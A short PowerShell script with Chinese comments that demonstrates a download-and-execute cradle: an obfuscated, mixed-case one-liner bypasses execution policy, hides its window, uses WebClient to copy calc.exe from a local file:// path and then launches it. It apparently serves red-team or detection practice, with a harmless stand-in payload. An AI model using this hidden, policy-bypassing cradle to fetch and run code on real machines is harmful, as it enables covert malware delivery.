# 获取运行脚本目录
$x = $MyInvocation.MyCommand.Definition
$x = Split-Path -Parent $MyInvocation.MyCommand.Definition
echo "当前路径为: $X\"


# 1、下载文件

# 当前路径下下载一个计算器.exe

pOWErsHell.ExE -exEcUTIonPOLICy BYpAsS -nOprOFile -winDOWStyLE HiDden (NEW-objeCt SYSTeM.Net.weBCLIEnT).DOWNloaDfIlE('file://C:\Windows\System32\calc.exe',"$X\powershell_calc.EXE");

# 1.1 拆分代码

$client = new-object System.Net.WebClient
$client.DownloadFile(‘file://C:\Windows\System32\calc.exe’, "$X\powershell_calc_1.EXE")


# 2、运行文件

sTArt-PrOCeSS "$X\powershell_calc.EXE"